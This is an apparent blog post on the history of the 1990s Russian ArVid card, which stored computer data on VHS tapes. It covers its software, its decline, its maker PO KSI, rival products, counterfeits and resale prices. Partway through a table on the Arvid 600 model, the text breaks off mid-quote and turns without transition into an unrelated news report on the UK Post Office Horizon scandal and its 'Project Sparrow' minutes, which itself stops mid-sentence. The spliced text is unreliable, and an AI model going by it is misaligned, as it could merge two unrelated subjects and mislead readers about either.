<p>The main User Interface for ArVid resembled the popular filesystem browsing program “Norton Commander” and made it simple to read and write files from a VHS tape. Other executables that came with the card let the user record Infrared signals for controlling their VCR, to change the configuration parameters, and to re-creating the special “table of contents” file that listed file locations on a particular VHS tape.</p>

<p>The hardware, software, documentation and “API” bundled with ArVid opened a world of possibilities. These were the tools that programmers needed to create their own applications on top of the device. One such programmer was Slava Gostrenko.</p>
<p><a href="https://web.archive.org/web/19981202040501/http://www.aha.ru/%7Egw/">Gostrenko created 3 interesting applications</a>:</p>
<ul>
<li><strong>Arvid Draw</strong> – a program that would show the contents of a text file to your “Big Screen” Television.</li>
<li><strong>Arvid Control</strong> – a program that could act on visual signals from a TV broadcast or a surveillance camera. With this program, ArVid owners could do basic object detection / change detection in video signals. These changes could then trigger actions on the PC. The main pitch for it: while recording your favourite shows, the program could pause VCR recording during commercial breaks and resume it when the ads ended. You’d get commercial-free tapes.</li>
<li><strong>Arvid Audio</strong> – a program that used the ArVid system to record audio (3 hours of music on a $2 tape). Audio could be recorded directly from CD, Audio In, or any other source that a SoundBlaster sound card could handle.</li>
</ul>

<h2>Endgame</h2>



<p>In the summer of 1998 PO KSI stopped producing the ArVid.</p>



<p>Later that year, <a href="https://old.computerra.ru/194873/">an article in the Russian computer journal “Computerra”</a><sup>🇷🇺</sup> claimed that ArVid dropped in popularity because HDD storage and CD-R drives became cheaper. That article’s author, Andrei Fatkullin, pointed out that ArVid never achieved an “economy of scale”. It was always priced at around $80 USD when the alternatives steadily got cheaper. (As an example, the latest ArVid cost <a href="https://groups.google.com/g/relcom.commerce.stocks/c/QVMaX4aqsaM/m/3FFZWLiySAkJ">$79 in 1994</a><sup>🇷🇺</sup> and <a href="https://groups.google.com/g/fido7.pvt.exch.pricelist/c/wDVs2uHY8w4/m/1EG4JOyWWIoJ">$90 in 1997</a><sup>🇷🇺</sup> while still doing the same fundamental “job”.)</p>



<p>I think Fatkullin is correct about the cause of ArVid’s death. From my vantage point in 2023 I can see that storage costs have been declining predictably – today $82 USD gets you a 2 Terabyte solid-state hard drive. Heck, for $8 USD you can get 128 GB of storage on a USB Stick. This doesn’t leave any space for a clunky data storage on VHS for $80…</p>



<p>A person who could’ve predicted this decline in price would see that a product in this space has a “built-in retirement date”. VHS always had an upper limit on capacity: PO KSI claimed it was 3.34GB for a 3-hour tape. The last ArVid device hit that ceiling at 325 Kbytes/sec. Using VHS tapes and unreliable domestic VCRs for data storage was a temporary measure. Your home VCR couldn’t compete with a purpose-built commercial device. It was all just a brilliant hack that let people in a dirt-poor country get massive storage for pennies.</p>



<p>Even in the peak years of 1994-1997 ArVid couldn’t be more than a niche product: the average consumer couldn’t even <strong>get</strong> their hands on 2GB worth of digital “stuff”. Why would you need a 2GB backup solution when your entire hard drive is just 500 MB in size? The “sweet spot” for ArVid was a small business or an academic organization – entities that would drop ArVid and “graduate” to a more “professional” backup solution as soon as they could.</p>



<p>In the <a href="https://www.phantom.sannata.org/viewtopic.php?t=2242&amp;start=33">Sannata forums</a><sup>🇷🇺</sup>, user “ASL” says that ArVid was a product that was mostly used by the Fido7 crowd, a small group:</p>



<blockquote>
<p>In those times, the Trio64 cost 40 bucks, while the first Pentium was 100. During our first year at the university, out of our class (120 people), only five students had a computer. Only those who really needed it would pay a hundred for an archiving board. And even then, you had  to know about it <em>(information about it mostly circulated among Fido network users). And that was not a lot of people.</em></p>
</blockquote>



<p>Another factor slowing its spread: this was not a user-friendly device. It required skill to set up, to “train” for working with your VCR, and to troubleshoot the variety of issues that cropped up along the way…</p>



<p>As for the makers of ArVid, the PO KSI company:</p>



<p>PO KSI is still around and they <a href="http://poksi.ru/homeeng.html">have a website</a>. They <a href="http://poksi.ru/arvid.html">claim that 200,000 ArVid boards were manufactured</a><sup>🇷🇺</sup> but that assertion is <a href="https://www.phantom.sannata.org/viewtopic.php?t=2242&amp;start=33">hotly contested</a><sup>🇷🇺</sup> based on the analysis of serial numbers on the devices. PO KSI always had multiple product lines to rely on, like digital document scanning equipment and satellite photography devices. </p>



<p>This story doesn’t have a happy ending.</p>



<p>Russia has a sickly economy, and it does not have <a href="https://www.lexisnexis.com/en-us/rule-of-law/rule-of-law-equation.page">Rule of Law</a>. Entrepreneurs have to find stability and protection from violence – and the best way to do so is to get in bed with the government (<a href="https://abcnews.go.com/Politics/shirtless-vladimir-putin-takes-dip-icy-russian-lake/story?id=52450562">the oh-so-sexy government</a>). If <a href="https://en.wikipedia.org/wiki/PO_KSI">you dig deeper</a>, you’ll discover that PO KSI has gone on to supply <a href="https://www.gazeta.ru/politics/2016/12/29_a_10456787.shtml">equipment for the Russian Census and for the military</a><sup>🇷🇺</sup>. In December 2016, the <a href="https://obamawhitehouse.archives.gov/the-press-office/2016/12/29/fact-sheet-actions-response-russian-malicious-cyber-activity-and">US White House sanctioned the company</a> for providing specialized training to Russia’s GRU spy agency.</p>



<p>Post-Soviet Russia in the 1990s was a wild and violent place. For budding computer enthusiasts, this was an exciting time. A time when it was finally possible to get your hands on western technology. A time to take your rightful place on the global Internet. The lack of money meant that you had to get inventive – the ArVid backup system was a shining example of this inventiveness, care and skill that could thrive in a chaotic environment. </p>



<p>But no amount of technical ability can change the reality of politics, power and even the national character of Russia. As I write this in 2023, Russian technologists can’t escape the same bleak choices facing ordinary Russians: escape, hide, persevere… or collaborate and prosper.</p>

<h3>Was ArVid the first of its kind?</h3>



<p>No. There were several Western products that tried to accomplish the same thing. Storing data on <em>magnetic tape</em> was not a new thing: <a href="https://en.wikipedia.org/wiki/Magnetic-tape_data_storage">tape was popular in the days of mainframes, and is still used today</a>. It is a cheap and reliable storage medium.</p>



<p>Storing data on <em>domestic VHS tapes</em> was the innovation here. It was also a logical next step from commercial tape technology, but only a few companies tried it and it ended up as a niche curiosity.</p>



<p>There is a long history of storing data on <a href="https://en.wikipedia.org/wiki/List_of_cassette_tape_data_storage_formats">media meant for domestic <strong>music</strong> playback</a>. The Commodore Datasette devices and the cassette drives for the Atari 400/800 computers used audio cassettes for data storage:</p>

<p>For those who are curious to learn more about digital data storage on analog cassettes, <a href="https://en.wikipedia.org/wiki/Digital_cassettes">this Wikipedia page is a good starting point</a>. The main principle is that data ones-and-zeroes can be turned into audio or video signals and stored just like a song or a movie.</p>





<p><a href="https://web.archive.org/web/20131019213353/http://blog.modernmechanix.com/the-floppy-rom-software-distributed-on-records/">An extreme example of using a domestic medium for data is the “Floppy ROM”</a> – a flexible <strong>turntable record</strong> that arrived as a magazine insert. You could put it on your record player, and “play” the programs on it into your computer. (<a href="https://www.youtube.com/watch?v=AvXXkB2jic0&amp;t=260s">Here it is on video</a> – you can see how thin and soft it is)</p>



<p>Moving from audio media to VHS tape, the Corvus “Mirror” device was one that <a href="https://bitsavers.org/pdf/corvus/brochures/PC_Mirror_Brochure.pdf">could store 91 megabytes of data on a 3-hour tape</a>. In 1980 Corvus filed patent US4380047A for the device. From <a href="http://www.bitsavers.org/pdf/corvus/service/Corvus_Mirror_Service_Manual.pdf">the Corvus Mirror manual</a>, it appears that the product was in-market in 1984. </p>



<p>Youtuber <a href="https://www.youtube.com/watch?v=xSnrQBfBCzY"><em>Technology Connections</em> has a great video about the early days of storing high-fidelity digital audio on VHS tape</a>. At <a href="https://youtu.be/xSnrQBfBCzY?feature=shared&amp;t=837">time 13:57</a>, you can see how effectively proper error-correction algorithms compensated for errors on tape. The audio signal sounds great despite Alec’s intentional interference with it. This is why the ArVid’s software had so many error control measures.</p>



<p>The <a href="https://web.archive.org/web/19970110151745/http://www.danmere.com/backer.html">Danmere Backer</a> was often compared to the ArVid. It could store 1.5 GB on a 3-hour VHS tape in normal mode and 3GB in long-play. Apparently, it showed a “file identifier” on screen to help you manually forward the tape to the precise spot where your file was stored.</p>

<h3>Counterfeits</h3>



<p>A passive-aggressive rant in the ArVid FAQ documents mentioned that PO KSI had to deal with “fake” ArVid cards. It appears that older cards – the ones that weren’t based on an FPGA microchip – could be hand-soldered from standard components.</p>



<p>Forum user “Vintik_33” on the Sannata forums claims that they participated in a ring that <a href="https://www.phantom.sannata.org/viewtopic.php?t=2242&amp;start=44">made fake etched plates and soldered ArVid clones from components</a><sup>🇷🇺</sup>.</p>



<figure><a href="https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device.jpg"><img loading="lazy" decoding="async" width="1024" height="689" src="https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device-1024x689.jpg" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device-1024x689.jpg 1024w, https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device-300x202.jpg 300w, https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device-768x517.jpg 768w, https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device-766x515.jpg 766w, https://jacobfilipp.com/wp-content/uploads/2024/01/counterfit-ArVid-device.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>An allegedly counterfeit ArVid card (<a href="https://www.phantom.sannata.org/viewtopic.php?t=2242&amp;start=33">source</a>).</figcaption></figure>



<h3>Where would people buy this device in the 90s?</h3>



<p>I spent a long time figuring out how PO KSI advertised these devices to the public. There were no magazine ads. Only a few spammy posts on Fido7… There were about 5 authorized dealers of the product listed in the FAQs – with most of them appearing to be individuals, rather than businesses. One endearing thing I found was a BBS file with prices and <strong>directions to the home </strong>of Mikel Lavrentyev, the primary dealer:</p>


<div>
<figure><a href="https://jacobfilipp.com/wp-content/uploads/2024/01/pricelist-and-mikel-address.png"><img loading="lazy" decoding="async" width="619" height="862" src="https://jacobfilipp.com/wp-content/uploads/2024/01/pricelist-and-mikel-address.png" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/pricelist-and-mikel-address.png 619w, https://jacobfilipp.com/wp-content/uploads/2024/01/pricelist-and-mikel-address-215x300.png 215w" sizes="(max-width: 619px) 100vw, 619px"></a></figure></div>


<p>In one forum discussion, a user backed their opinion that ArVid had limited sales by stating “I visited Mikel’s place to pick up my device – and it didn’t look like the home of a high-earning businessman”.</p>



<p>I believe that knowledge of this product spread by word of mouth. Especially among BBS operators. Mikel, in particular, seemed to be a key member of the Fido7 network of technologists and would have been part of the social scene in the 90s. This method of marketing would’ve been great for staying under the radar of local criminals, but terrible for attracting the public’s business…</p>



<h3>How much will an ArVid cost me today?</h3>



<p>Nowadays (<em>the year 2023 – when men were horses, and horses knew the value of a nickel</em>), a 1052 card sells for $10USD on Meshok.net. I also saw an old computer with an ArVid installed on sale for 18,500 Roubles – about $205 USD – on Avito.ru. You can search Avito, Meshok and Youla.ru for the Russian word “Арвид” to find it.</p>



<p>Russia is under financial sanctions, so you may have trouble paying for the device and getting it shipped. You might have better luck looking for one on Ukrainian sites. Back in the 90s there was an official dealer in Kiev so there would be a few floating around. Stunningly, even though Ukraine is a warzone I’ve been able to get eBay-bought items from Ukrainian dealers. With real-time shipment tracking and all!<br></p>

<figure><table><tbody><tr><td><strong>Arvid 600</strong> <br>Was the first model, possibly internal. Worked only with Toshiba VS-109CZ and used exclusively the VCR’s time position indexing. But with a move towards supporting a variety of VCRs, Arvid couldn’t rely on that being present or to work well.<p>“[AD] The very first Arvids (Arvid-600 model) used only index search. However, they were initially designed only for VCR models Toshiba VS-109CZ, which happened to be in the KSI due to a certain batch. The index search there was quite reliable.

"That's coming out now. It's undeniable. </p></div><div data-component="text-block"><p>"And this is what we've been up against all the way. We've always known they were covering up - it's just been very difficult to find proof," he added. </p></div><div data-component="text-block"><p>The secret plan to sack Second Sight is revealed in the minutes of two Project Sparrow meetings in April 2014.</p></div><div data-component="text-block"><p>The minutes were released in heavily redacted form in 2021 after former Post Office chief executive Paula Vennells disclosed the existence of Project Sparrow. </p></div><div data-component="text-block"><p>Now the BBC has obtained the unredacted minutes, showing what the Post Office didn't want the public to see. </p></div><div data-component="image-block"><figure><figcaption><span>Image caption, </span><p>The minutes from a meeting in April 2014</p></figcaption></figure></div><p data-component="subheadline-block"><h2 tabindex="-1" id="Project-Sparrow"><span role="text">Project Sparrow</span></h2></p><div data-component="text-block"><p>The Project Sparrow sub-committee was led by Post Office chair Alice Perkins and included chief executive Paula Vennells, alongside the Post Office's most senior internal lawyer, general counsel Chris Aujard, and Richard Callard, a senior civil servant at UK Government Investments, then a division of the Department for Business, Energy and Industrial Strategy.</p></div><div data-component="text-block"><p>The unredacted minutes for 9 April 2014 show the sub-committee asking for a paper to be prepared on the role of Second Sight and "options to support them or reduce their role".</p></div><div data-component="text-block"><p>Three weeks later, on 30 April 2014, they agree on a plan to bring the investigation of sub-postmasters' cases "within the control of the Post Office", removing Second Sight from its role of investigating sub-postmasters' cases independently. </p></div><div data-component="text-block"><p>However, that decision was kept secret from Parliament and the public as the Post Office claimed Second Sight's independent review supported its approach to sub-postmasters' complaints. The Post Office was then seeking to defuse the scandal through a mediation scheme, which excluded many victims from compensation.</p></div><p data-component="subheadline-block"><h2 tabindex="-1" id="Bugs-in-the-system-"><span role="text">Bugs in the system </span></h2></p><div data-component="text-block"><p>Nine months before the committee met, Second Sight submitted a report on 8 July 2013 identifying computer bugs that raised doubts over the reliability of Horizon data used to prosecute sub-postmasters.</p></div><div data-component="text-block"><p>A week later, on 15 July 2013, the Post Office was warned in formal advice written by its own lawyer Simon Clarke that it was in breach of its legal duties because sub-postmasters who had been prosecuted should have been told about the bugs. </p></div><div data-component="text-block"><p>The next day, 16 July 2013, the Post Office board expressed concern that Second Sight's review exposed the business to claims of wrongful convictions.</p></div><div data-component="text-block"><p>Yet the Project Sparrow minutes from April 2014 show Paula Vennells, Alice Perkins and the other members discussed closing or speeding up the mediation scheme and planning to pay minimal compensation to sub-postmasters.</p></div><div data-component="image-block"><figure><figcaption><span>Image caption, </span><p>Alan Bates says it's been "a cover-up from start to finish"</p></figcaption></figure></div><div data-component="text-block"><p>That followed advice from lawyers Linklaters that they had only "very limited liability in relation to financial redress".</p></div><div data-component="text-block"><p>The minutes show the committee asking for a paper to brief them on making "token payments" to sub-postmasters applying to the mediation scheme, trumpeted in public at the time by ministers as a solution to sub-postmasters' complaints. </p></div><div data-component="text-block"><p>"The cost of all cases in the scheme going to mediation would be in the region of £1m," the unredacted minutes state. </p></div><div data-component="text-block"><p>Members of the committee knew sub-postmasters wouldn't be happy and that there was a "real risk" that "many applicants will remain dissatisfied at the end of the process".</p></div><div data-component="text-block"><p>On 30 April 2014, following advice from Chris Aujard, the committee decided not to make any "ex gratia" payments - meaning payments to struggling sub-postmasters to help them while their cases were examined. </p></div><div data-component="text-block"><p>They also asked for a paper to be prepared on options for closing or speeding up the mediation scheme. </p></div><div data-component="text-block"><p>Second Sight's interim report in 2013 did say that it had found no systemic flaws in the Horizon system. But the word "systemic" had a specific meaning - that no flaws could be found in every single post office branch. </p></div><div data-component="text-block"><p>What the Post Office didn't say was that it also made an unwelcome finding, identifying incidents where defects or bugs in the Horizon software "gave rise to 76 branches being affected by incorrect balances or transactions which took some time to identify and correct".</p></div><div data-component="text-block"><p>On 17 December 2014, Jo Swinson, the former Liberal Democrat MP who served as Postal Affairs minister in the coalition government at the time, answered a parliamentary debate on the scandal. She pointed to the independent role of Second Sight.</p></div><div data-component="text-block"><p>The following year, in March 2015, as it prepared to submit its full report, 11 months after the decision had been taken, Second Sight's contract was terminated and the Post Office brought investigation of the sub-postmasters' cases in-house.</p></div><div data-component="text-block"><p>Lord Arbuthnot, a former MP and vocal critic of the handling of victims in this scandal told the BBC that the government has to take responsibility "for everything that went wrong" in relation to the sub-postmasters.</p></div><div data-component="text-block"><p>"It's a distinctly corrupt, murky story that goes right the way into government and it's deeply worrying," he said.</p></div><div data-component="text-block"><p>The prime minister's spokesperson said on Friday it was "right" that there was an inquiry ongoing and pointed out that the reports related to a previous administration.</p></div><div data-component="text-block"><p>"It is for the inquiry to establish culpability and to look at what lessons have to be learned. For the government's part we are co-operating and supporting the inquiry fully," the spokesperson added.</p></div><div data-component="text-block"><p>Alice Perkins and Paula Vennells didn't respond to requests for comment. </p></div><div data-component="text-block"><p>Linklaters also did not comment.</p></div><div data-component="text-block"><p>Chris Aujard and Richard Callard said through public relations advisers that they would not comment while the inquiry was ongoing. </p></div><div data-component="text-block"><p>UK Government Investments declined to comment.</p></div><div data-component="text-block"><p>A Post Office spokesperson said: "We never discuss individuals and it would be inappropriate to comment on allegations being made outside of the Inquiry, whose role it is to consider all of the evidence on the issues it is examining and independently reach conclusions. </p></div><div data-component="text-block"><p>"We fully share the Public Inquiry's aims to get to the truth of what happened in the past and accountability."</p></div><div data-component="text-block"><p><b>Are you affected by the issues raised in this story?
